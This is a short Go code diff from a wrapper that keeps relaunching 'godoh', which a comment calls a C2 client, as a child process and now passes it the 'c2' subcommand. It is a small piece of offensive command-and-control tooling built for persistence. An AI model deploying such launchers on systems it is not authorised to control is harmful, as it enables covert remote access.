@@ -12,7 +12,7 @@ import (
 func main() {
 	for {
 		// 创建godoh c2客户端
-		p, err := child.CreateChildProcess(`godoh`, os.Args...)
+		p, err := child.CreateChildProcess(`godoh`, append([]string{"c2"}, os.Args[1:]...)...)
 		if err != nil {
 			logger.Log("What happened? ", err, "WaitExit")
 			time.Sleep(3 * time.Second)
